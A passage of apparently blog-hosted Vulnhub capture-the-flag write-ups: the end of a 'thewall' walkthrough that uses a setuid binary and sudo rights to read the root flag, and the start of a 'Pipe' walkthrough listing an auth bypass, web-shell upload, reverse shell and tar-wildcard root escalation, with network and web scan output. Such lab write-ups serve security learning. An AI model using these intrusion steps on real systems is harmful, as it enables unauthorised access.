</span><span class='line'>drwxr-xr-x  <span class="m">2</span> root  welcometothemachine   <span class="m">512</span> Aug  <span class="m">8</span> 00:33 .
</span><span class='line'>drwxr-x---  <span class="m">4</span> www   welcometothemachine   <span class="m">512</span> Nov <span class="m">27</span> 01:47 ..
</span><span class='line'>-rws--s---  <span class="m">1</span> root  welcometothemachine  <span class="m">7513</span> Nov <span class="m">27</span> 01:47 PinkFloyd
</span><span class='line'><span class="nv">$ </span>
</span></code></pre></td></tr></table></div></figure>


<p>After run the file <code>PinkFloyd</code> and input the answer <code>50696e6b466c6f796435305965617273</code></p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>/var/www/htdocs/welcometothemachine/PinkFloyd
</span><span class='line'>Please send your answer to Old Pink, in care of the Funny Farm. - Pink Floyd, Empty Spaces
</span><span class='line'>Answer: 50696e6b466c6f796435305965617273
</span><span class='line'>
</span><span class='line'>Fearlessly the idiot faced the crowd smiling. - Pink Floyd, Fearless
</span><span class='line'>
</span><span class='line'>Congratulations... permission has been granted.
</span><span class='line'>You can now <span class="nb">set </span>your controls to the heart of the sun!
</span><span class='line'><span class="nv">$ </span>
</span></code></pre></td></tr></table></div></figure>


<p>Notice the sentence: <font color="red"><code>Congratulations... permission has been granted.</code></font> by checking the sudo file, we are now can run any command as any users including ROOT!</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>sudo -l
</span><span class='line'>Password:
</span><span class='line'>Matching Defaults entries <span class="k">for</span> DavidGilmour on thewall:
</span><span class='line'>    env_keep+<span class="o">=</span><span class="s2">&quot;FTPMODE PKG_CACHE PKG_PATH SM_PATH SSH_AUTH_SOCK&quot;</span>
</span><span class='line'>
</span><span class='line'>User DavidGilmour may run the following commands on thewall:
</span><span class='line'>    <span class="o">(</span>ALL<span class="o">)</span> SETENV: ALL
</span></code></pre></td></tr></table></div></figure>


<p>Now catch the Flag!!</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>sudo ls -al /root
</span><span class='line'>total 48
</span><span class='line'>drwx------   <span class="m">5</span> root  wheel   <span class="m">512</span> Nov <span class="m">27</span> 02:04 .
</span><span class='line'>drwxr-xr-x  <span class="m">13</span> root  wheel   <span class="m">512</span> Oct <span class="m">24</span> 18:03 ..
</span><span class='line'>-rw-r--r--   <span class="m">1</span> root  wheel    <span class="m">87</span> Aug <span class="m">16</span> 18:25 .Xdefaults
</span><span class='line'>-rw-r--r--   <span class="m">1</span> root  wheel   <span class="m">578</span> Aug <span class="m">16</span> 18:25 .cshrc
</span><span class='line'>-rw-r--r--   <span class="m">1</span> root  wheel    <span class="m">94</span> Aug <span class="m">16</span> 18:25 .cvsrc
</span><span class='line'>-rw-r--r--   <span class="m">1</span> root  wheel   <span class="m">328</span> Aug <span class="m">16</span> 18:25 .login
</span><span class='line'>-rw-r--r--   <span class="m">1</span> root  wheel   <span class="m">468</span> Aug <span class="m">16</span> 18:25 .profile
</span><span class='line'>drwx------   <span class="m">2</span> root  wheel   <span class="m">512</span> Nov <span class="m">27</span> 05:01 .ssh
</span><span class='line'>-rw-r--r--   <span class="m">1</span> root  wheel  <span class="m">2739</span> Nov <span class="m">27</span> 01:07 flag.txt
</span><span class='line'>drwxr-xr-x   <span class="m">2</span> root  wheel   <span class="m">512</span> Nov <span class="m">14</span> 02:43 scripts
</span><span class='line'>drwxr-xr-x   <span class="m">2</span> root  wheel   <span class="m">512</span> Oct <span class="m">27</span> 03:10 tmp
</span><span class='line'><span class="nv">$ </span>sudo cat /root/flag.txt
</span><span class='line'>
</span><span class='line'><span class="s2">&quot;The band is fantastic, that is really what I think. Oh, by the way, which one is Pink? - Pink Floyd, Have A Cigar&quot;</span>
</span><span class='line'>
</span><span class='line'>                   Congratulations on rooting thewall!
</span><span class='line'>
</span><span class='line'>   ___________________________________________________________________
</span><span class='line'>  <span class="p">|</span> <span class="p">|</span>       <span class="p">|</span>       <span class="p">|</span>       <span class="p">|</span>       <span class="p">|</span>       <span class="p">|</span>       <span class="p">|</span>       <span class="p">|</span>       <span class="p">|</span> <span class="p">|</span>
</span><span class='line'>  <span class="p">|</span>_<span class="p">|</span>_______<span class="p">|</span>_______<span class="p">|</span>______ <span class="s1">&#39;__  ___|_______|_______|_______|_______|_|</span>
</span><span class='line'><span class="s1">  |     |       |       |   |  )      /         |       |       |     |</span>
</span><span class='line'><span class="s1">  |_____|_______|_______|__ |,&#39;</span> , .  <span class="p">|</span> <span class="p">|</span> _ , ___<span class="p">|</span>_______<span class="p">|</span>_______<span class="p">|</span>_____<span class="p">|</span>
</span><span class='line'>  <span class="p">|</span> <span class="p">|</span>       <span class="p">|</span>       <span class="p">|</span>      ,<span class="p">|</span>   <span class="p">|</span> <span class="p">|</span><span class="se">\ </span><span class="p">|</span> <span class="p">|</span> ,<span class="s1">&#39; |       |       |       | |</span>
</span><span class='line'><span class="s1">  |_|_______|_______|____ &#39;</span> <span class="p">|</span> _ <span class="p">|</span> <span class="p">|</span> <span class="se">\|</span> <span class="p">|</span><span class="s1">&#39;\ _|_______|_______|_______|_|</span>
</span><span class='line'><span class="s1">  |     |       |       |   \  _&#39;</span> <span class="s1">&#39;  ` |  \     |       |       |     |</span>
</span><span class='line'><span class="s1">  |_____|_______|_______|_  ,-&#39;</span>_ _____ <span class="p">|</span> _______<span class="p">|</span>_______<span class="p">|</span>_______<span class="p">|</span>_____<span class="p">|</span>
</span><span class='line'>  <span class="p">|</span> <span class="p">|</span>       <span class="p">|</span>       <span class="p">|</span>   ,-<span class="s1">&#39;|  _     |       |       |       |       | |</span>
</span><span class='line'><span class="s1">  |_|_______|_______|__  ,-|-&#39;</span> <span class="p">|</span>  ,-. <span class="se">\ </span>/_.--. _____<span class="p">|</span>_______<span class="p">|</span>_______<span class="p">|</span>_<span class="p">|</span>
</span><span class='line'>  <span class="p">|</span>     <span class="p">|</span>       <span class="p">|</span>          <span class="p">|</span>   <span class="p">|</span>  <span class="p">|</span> <span class="p">|</span>  V  <span class="p">|</span>   <span class="o">)</span> <span class="p">|</span>       <span class="p">|</span>       <span class="p">|</span>     <span class="p">|</span>
</span><span class='line'>  <span class="p">|</span>_____<span class="p">|</span>_______<span class="p">|</span>_______<span class="p">|</span>_ <span class="p">|</span> _ <span class="p">|</span>-<span class="s1">&#39;`-&#39;</span>  <span class="p">|</span>  <span class="p">|</span> ,<span class="s1">&#39; _|_______|_______|_____|</span>
</span><span class='line'><span class="s1">  | |       |       |      |        |  &#39;</span>  <span class="p">;</span><span class="s1">&#39;        |       |       | |</span>
</span><span class='line'><span class="s1">  |_|_______|_______|______&quot;|_____  _,- o&#39;</span>__<span class="p">|</span>_______<span class="p">|</span>_______<span class="p">|</span>_______<span class="p">|</span>_<span class="p">|</span>
</span><span class='line'>  <span class="p">|</span>     <span class="p">|</span>       <span class="p">|</span>       <span class="p">|</span>       _,-<span class="s1">&#39;    .       |       |       |     |</span>
</span><span class='line'><span class="s1">  |_____|_______|_______|_ _,--&#39;</span><span class="se">\ </span>     _,-<span class="s1">&#39;_____|_______|_______|_____|</span>
</span><span class='line'><span class="s1">  | |       |       |     &#39;</span>     <span class="o">||</span>_<span class="o">||</span>-<span class="s1">&#39; _   |       |       |       | |</span>
</span><span class='line'><span class="s1">  |_|_______|_______|_______|__ || ||,-&#39;</span>  __<span class="p">|</span>_______<span class="p">|</span>_______<span class="p">|</span>_______<span class="p">|</span>_<span class="p">|</span>
</span><span class='line'>  <span class="p">|</span>     <span class="p">|</span>       <span class="p">|</span>       <span class="p">|</span>       <span class="p">|</span>  <span class="o">||</span>_,-<span class="s1">&#39;       |       |       |     |</span>
</span><span class='line'><span class="s1">  |_____|_______|______.|_______.__  ___|_______|_______|_______|_____|</span>
</span><span class='line'><span class="s1">  | |       |       |   \    |     /        |       |       |       | |</span>
</span><span class='line'><span class="s1">  |_|_______|_______|___ \ __|___ /,  _ |   | ______|_______|_______|_|</span>
</span><span class='line'><span class="s1">  |     |       |       | \      // \   |   |   |       |       |     |</span>
</span><span class='line'><span class="s1">  |_____|_______|_______|_ \ /\ //--&#39;</span><span class="se">\ </span> <span class="p">|</span>   <span class="p">|</span> __<span class="p">|</span>_______<span class="p">|</span>_______<span class="p">|</span>_____<span class="p">|</span>
</span><span class='line'>  <span class="p">|</span> <span class="p">|</span>       <span class="p">|</span>       <span class="p">|</span>       <span class="s1">&#39;  V/    |  |-&#39;</span> <span class="p">|</span>__,    <span class="p">|</span>       <span class="p">|</span>       <span class="p">|</span> <span class="p">|</span>
</span><span class='line'>  <span class="p">|</span>_<span class="p">|</span>_______<span class="p">|</span>_______<span class="p">|</span>_______<span class="p">|</span>_______ _______<span class="err">&#39;</span>_______<span class="p">|</span>_______<span class="p">|</span>_______<span class="p">|</span>_<span class="p">|</span>
</span><span class='line'>  <span class="p">|</span>     <span class="p">|</span>       <span class="p">|</span>       <span class="p">|</span>       <span class="p">|</span>       <span class="p">|</span>       <span class="p">|</span>       <span class="p">|</span>       <span class="p">|</span>     <span class="p">|</span>
</span><span class='line'>  <span class="p">|</span>_____<span class="p">|</span>_______<span class="p">|</span>_______<span class="p">|</span>_______<span class="p">|</span>_______<span class="p">|</span>_______<span class="p">|</span>_______<span class="p">|</span>_______<span class="p">|</span>_____<span class="p">|</span>
</span><span class='line'>  <span class="p">|</span>_________<span class="p">|</span>_______<span class="p">|</span>_______<span class="p">|</span>_______<span class="p">|</span>_______<span class="p">|</span>_______<span class="p">|</span>_______<span class="p">|</span>_______<span class="p">|</span>_<span class="p">|</span>
</span><span class='line'>
</span><span class='line'>                  Celebrating <span class="m">50</span> years of Pink Floyd!
</span><span class='line'>             Syd Barrett <span class="o">(</span>RIP<span class="o">)</span>, Nick Mason, Roger Waters,
</span><span class='line'>               Richard Wright <span class="o">(</span>RIP<span class="o">)</span>, and David Gilmour.
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>** Shoutouts **
</span><span class='line'>+ @vulnhub <span class="k">for</span> making it all possible
</span><span class='line'>+ @rastamouse @thecolonial - <span class="s2">&quot;the test bunnies&quot;</span>
</span><span class='line'>
</span><span class='line'>-<span class="o">=========================================</span>-
</span><span class='line'>-  xerubus <span class="o">(</span>@xerubus - www.mogozobo.com<span class="o">)</span>  -
</span><span class='line'>-<span class="o">=========================================</span>-
</span></code></pre></td></tr></table></div></figure>


<p>Cheers to <a href="http://www.mogozobo.com/">Xerubus</a>, really funny and enjoyable challenge with tons of knowledge. <strong>Greate job!!</strong></p>

<!--- Reference -->



]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[[Vulnhub] Pipe]]></title>
    <link href="http://f4l13n5n0w.github.io/blog/2015/11/23/vulnhub-pipe/"/>
    <updated>2015-11-23T21:43:52+11:00</updated>
    <id>http://f4l13n5n0w.github.io/blog/2015/11/23/vulnhub-pipe</id>
    <content type="html"><![CDATA[<p><strong>/dev/random: Pipe</strong> is another one CTF challange in the series <strong>/dev/random</strong>, which is created by <a href="https://www.vulnhub.com/author/sagi-,36/">Sagi-</a>.</p>

<p>More information and OVA file download please check <a href="https://www.vulnhub.com/entry/devrandom-pipe,124/">here</a>.</p>

<!-- more -->


<h2>Attacker &amp; Target</h2>

<p>Attacker: Kali2 Linux (<em>10.1.1.130/24</em>)</p>

<p>Target: /dev/random: Pipe (<em>10.1.1.143/24</em>)</p>

<h2>Vulnerability &amp; Exploit</h2>

<ul>
<li>Basic Authentication bypass: <a href="https://bz.apache.org/bugzilla/show_bug.cgi?id=28778" title="HTTP method tamper in 2004">HTTP method tamper</a></li>
<li>Backup file <code>Log.php.BAK</code> exists in the server and source code disclosure</li>
<li>Analyze and found the source code is able to upload arbitrary file, which can be used to upload web shell</li>
<li>After got a shell, enumerating and find the vulnerablity <code>tar with wildcard *</code> can be exploited to ROOT</li>
</ul>


<h2>Method</h2>

<ul>
<li>Scanned the network to discover the target server [<font color="FF8000">arp-scan</font>]</li>
<li>Port scanned the target to discover running services and open ports [<font color="FF8000">masscan</font> &amp;&amp; <font color="FF8000">nmap</font>]</li>
<li>Using HTTP method tamper to bypass the Basic Authentication on resource page <code>index.php</code> [<font color="FF8000">nmap with script</font>]</li>
<li>Brute force scan to find hidden path [<font color="FF8000">dirbuster</font>]</li>
<li>Found and analysed source code in finding files <code>php.js</code> and <code>Log.php.BAK</code>, as a result, find a file upload function.</li>
<li>Write web shell to target server and use <code>nc</code> to get a reverse shell [<font color="FF8000">nc</font>]</li>
<li>Enumeration and exploit <code>tar with wildcard</code> vulnerability to get ROOT</li>
</ul>


<h2>Tools</h2>

<p>All the tools used here can be found in Kali Linux</p>

<ul>
<li><a href="http://linux.die.net/man/1/arp-scan">arp-scan</a></li>
<li><a href="https://github.com/robertdavidgraham/masscan">masscan</a></li>
<li><a href="https://nmap.org/">nmap</a></li>
<li><a href="https://www.mozilla.org/en-US/firefox/new/">firefox</a></li>
<li><a href="https://cirt.net/Nikto2">nikto</a></li>
<li><a href="https://www.owasp.org/index.php/Category:OWASP_DirBuster_Project">dirbuster</a></li>
<li><a href="https://portswigger.net/burp/">burp suite</a></li>
<li><a href="http://linux.die.net/man/1/nc">nc</a></li>
</ul>


<h2>Walkthrough</h2>

<p>Using <code>arp-scan</code> as routine to detect the target&rsquo;s IP address (10.1.1.143 in this case).</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# arp-scan -l
</span><span class='line'>Interface: eth0, datalink <span class="nb">type</span>: EN10MB <span class="o">(</span>Ethernet<span class="o">)</span>
</span><span class='line'>Starting arp-scan 1.9 with <span class="m">256</span> hosts <span class="o">(</span>http://www.nta-monitor.com/tools/arp-scan/<span class="o">)</span>
</span><span class='line'>10.1.1.1  00:50:56:c0:00:08   VMware, Inc.
</span><span class='line'>10.1.1.2  00:50:56:fd:d1:6b   VMware, Inc.
</span><span class='line'>10.1.1.143    00:0c:29:64:39:5e   VMware, Inc.
</span><span class='line'>10.1.1.254    00:50:56:f5:74:35   VMware, Inc.
</span><span class='line'>
</span><span class='line'><span class="m">4</span> packets received by filter, <span class="m">0</span> packets dropped by kernel
</span><span class='line'>Ending arp-scan 1.9: <span class="m">256</span> hosts scanned in 2.657 seconds <span class="o">(</span>96.35 hosts/sec<span class="o">)</span>. <span class="m">4</span> responded
</span></code></pre></td></tr></table></div></figure>


<p>10.1.1.143 is our Target!</p>

<p>Then run <code>masscan</code> to detect opening ports on the target (masscan is much faster than nmap when doing a full ports scan, so here I use it to make a full scan and then use nmap to do a deep scan on target ports).</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# masscan -p1-65535 10.1.1.143/32 --rate<span class="o">=</span>10000
</span><span class='line'>
</span><span class='line'>Starting masscan 1.0.3 <span class="o">(</span>http://bit.ly/14GZzcT<span class="o">)</span> at 2015-11-21 00:47:26 GMT
</span><span class='line'> -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
</span><span class='line'>Initiating SYN Stealth Scan
</span><span class='line'>Scanning <span class="m">1</span> hosts <span class="o">[</span><span class="m">65535</span> ports/host<span class="o">]</span>
</span><span class='line'>Discovered open port 40117/tcp on 10.1.1.143
</span><span class='line'>Discovered open port 111/tcp on 10.1.1.143
</span><span class='line'>Discovered open port 80/tcp on 10.1.1.143
</span><span class='line'>Discovered open port 22/tcp on 10.1.1.143
</span></code></pre></td></tr></table></div></figure>


<p>There are 4 ports (22, 80, 111, 40117) detected by <code>masscan</code>, then I run <code>nmap</code> to do a deeper service scan.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="c"># Nmap 6.49BETA5 scan initiated Tue Nov 17 05:50:42 2015 as: nmap -sV -v -O -A -T4 -p80,22,111,44161 -oN 10.1.1.143_nmap.txt 10.1.1.143</span>
</span><span class='line'>Nmap scan report <span class="k">for</span> 10.1.1.143
</span><span class='line'>Host is up <span class="o">(</span>0.00035s latency<span class="o">)</span>.
</span><span class='line'>PORT      STATE SERVICE VERSION
</span><span class='line'>22/tcp    open  ssh     OpenSSH 6.7p1 Debian <span class="m">5</span> <span class="o">(</span>protocol 2.0<span class="o">)</span>
</span><span class='line'><span class="p">|</span> ssh-hostkey:
</span><span class='line'><span class="p">|</span>   <span class="m">1024</span> 16:48:50:89:e7:c9:1f:90:ff:15:d8:3e:ce:ea:53:8f <span class="o">(</span>DSA<span class="o">)</span>
</span><span class='line'><span class="p">|</span>   <span class="m">2048</span> ca:f9:85:be:d7:36:47:51:4f:e6:27:84:72:eb:e8:18 <span class="o">(</span>RSA<span class="o">)</span>
</span><span class='line'><span class="p">|</span>_  <span class="m">256</span> d8:47:a0:87:84:b2:eb:f5:be:fc:1c:f1:c9:7f:e3:52 <span class="o">(</span>ECDSA<span class="o">)</span>
</span><span class='line'>80/tcp    open  http    Apache httpd
</span><span class='line'><span class="p">|</span> http-auth:
</span><span class='line'><span class="p">|</span> HTTP/1.1 <span class="m">401</span> Unauthorized
</span><span class='line'><span class="p">|</span>_  Basic <span class="nv">realm</span><span class="o">=</span>index.php
</span><span class='line'><span class="p">|</span>_http-methods: No Allow or Public header in OPTIONS response <span class="o">(</span>status code 401<span class="o">)</span>
</span><span class='line'><span class="p">|</span>_http-server-header: Apache
</span><span class='line'><span class="p">|</span>_http-title: <span class="m">401</span> Unauthorized
</span><span class='line'>111/tcp   open  rpcbind 2-4 <span class="o">(</span>RPC <span class="c">#100000)</span>
</span><span class='line'><span class="p">|</span> rpcinfo:
</span><span class='line'><span class="p">|</span>   program version   port/proto  service
</span><span class='line'><span class="p">|</span>   <span class="m">100000</span>  2,3,4        111/tcp  rpcbind
</span><span class='line'><span class="p">|</span>   <span class="m">100000</span>  2,3,4        111/udp  rpcbind
</span><span class='line'><span class="p">|</span>   <span class="m">100024</span>  <span class="m">1</span>          37301/udp  status
</span><span class='line'><span class="p">|</span>_  <span class="m">100024</span>  <span class="m">1</span>          44161/tcp  status
</span><span class='line'>44161/tcp open  status  <span class="m">1</span> <span class="o">(</span>RPC <span class="c">#100024)</span>
</span><span class='line'>MAC Address: 00:0C:29:64:39:5E <span class="o">(</span>VMware<span class="o">)</span>
</span><span class='line'>Warning: OSScan results may be unreliable because we could not find at least <span class="m">1</span> open and <span class="m">1</span> closed port
</span><span class='line'>Device <span class="nb">type</span>: general purpose
</span><span class='line'>Running: Linux 3.X
</span><span class='line'>OS CPE: cpe:/o:linux:linux_kernel:3
</span><span class='line'>OS details: Linux 3.2 - 3.19
</span><span class='line'>Uptime guess: 0.001 days <span class="o">(</span>since Tue Nov <span class="m">17</span> 05:49:56 2015<span class="o">)</span>
</span><span class='line'>Network Distance: <span class="m">1</span> hop
</span><span class='line'>... turncate ...
</span></code></pre></td></tr></table></div></figure>


<p>Due to port 80 is open (providing web service on the target server), run <code>Nikto</code> to do a web vuln scan:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/the_pipe# nikto -host 10.1.1.143
</span><span class='line'>- Nikto v2.1.6
</span><span class='line'>---------------------------------------------------------------------------
</span><span class='line'>+ Target IP:          10.1.1.143
</span><span class='line'>+ Target Hostname:    10.1.1.143
</span><span class='line'>+ Target Port:        80
</span><span class='line'>+ Start Time:         2015-11-20 19:53:42 <span class="o">(</span>GMT-5<span class="o">)</span>
</span><span class='line'>---------------------------------------------------------------------------
</span><span class='line'>+ Server: Apache
</span><span class='line'>+ The anti-clickjacking X-Frame-Options header is not present.
</span><span class='line'>+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
</span><span class='line'>+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME <span class="nb">type</span>
</span><span class='line'>+ / - Requires Authentication <span class="k">for</span> realm <span class="s1">&#39;index.php&#39;</span>
</span><span class='line'>+ No CGI Directories found <span class="o">(</span>use <span class="s1">&#39;-C all&#39;</span> to force check all possible <span class="nb">dirs</span><span class="o">)</span>
</span><span class='line'>+ / - Requires Authentication <span class="k">for</span> realm <span class="s1">&#39;index.php&#39;</span>
</span><span class='line'>+ IP address found in the <span class="s1">&#39;location&#39;</span> header. The IP is <span class="s2">&quot;127.0.1.1&quot;</span>.
</span><span class='line'>+ OSVDB-630: IIS may reveal its internal or real IP in the Location header via a request to the /images directory. The value is <span class="s2">&quot;http://127.0.1.1/images/&quot;</span>.
</span><span class='line'>... turncat ...
</span><span class='line'>+ / - Requires Authentication <span class="k">for</span> realm <span class="s1">&#39;index.php&#39;</span>
</span><span class='line'>... turncat ...
</span><span class='line'>+ OSVDB-3268: /images/: Directory indexing found.
</span><span class='line'>+ / - Requires Authentication <span class="k">for</span> realm <span class="s1">&#39;index.php&#39;</span>
</span><span class='line'>+ OSVDB-3268: /images/?pattern<span class="o">=</span>/etc/*<span class="p">&amp;</span><span class="nv">sort</span><span class="o">=</span>name: Directory indexing found.
</span><span class='line'>+ / - Requires Authentication <span class="k">for</span> realm <span class="s1">&#39;index.php&#39;</span>
</span><span class='line'>+ <span class="m">7667</span> requests: <span class="m">0</span> error<span class="o">(</span>s<span class="o">)</span> and <span class="m">7</span> item<span class="o">(</span>s<span class="o">)</span> reported on remote host
</span><span class='line'>+ End Time:           2015-11-20 19:54:03 <span class="o">(</span>GMT-5<span class="o">)</span> <span class="o">(</span><span class="m">21</span> seconds<span class="o">)</span>
</span><span class='line'>---------------------------------------------------------------------------
</span><span class='line'>+ <span class="m">1</span> host<span class="o">(</span>s<span class="o">)</span> tested
</span></code></pre></td></tr></table></div></figure>


<p>Nikto scan could not find any suspicious footprint, then I try Dirbuster to brute force hidden folders / files:</p>

<p>Two source code files discovered in folder &lsquo;scriptz&rsquo;:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>/scriptz/log.php.BAK
</span><span class='line'>/scriptz/php.js</span></code></pre></td></tr></table></div></figure>


<p>Analyze the first file &ldquo;log.php.BAK&rdquo;, this is a backup of &ldquo;log.php&rdquo; obviously, so if I can find / run &ldquo;log.php&rdquo; I would be able to upload shell to the target server:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&lt;</span><span class="nx">\</span><span class="o">?</span><span class="nx">php</span>
</span><span class='line'><span class="k">class</span> <span class="nc">Log</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>    <span class="k">public</span> <span class="nv">$filename</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
</span><span class='line'>    <span class="k">public</span> <span class="nv">$data</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">public</span> <span class="k">function</span> <span class="nf">__construct</span><span class="p">()</span>
</span><span class='line'>    <span class="p">{</span>
</span><span class='line'>        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">filename</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
</span><span class='line'>  <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">data</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">public</span> <span class="k">function</span> <span class="nf">PrintLog</span><span class="p">()</span>
</span><span class='line'>    <span class="p">{</span>
</span><span class='line'>        <span class="nv">$pre</span> <span class="o">=</span> <span class="s2">&quot;[LOG]&quot;</span><span class="p">;</span>
</span><span class='line'>  <span class="nv">$now</span> <span class="o">=</span> <span class="nb">date</span><span class="p">(</span><span class="s1">&#39;Y-m-d H:i:s&#39;</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>        <span class="nv">$str</span> <span class="o">=</span> <span class="s1">&#39;$pre - $now - $this-&gt;data&#39;</span><span class="p">;</span>
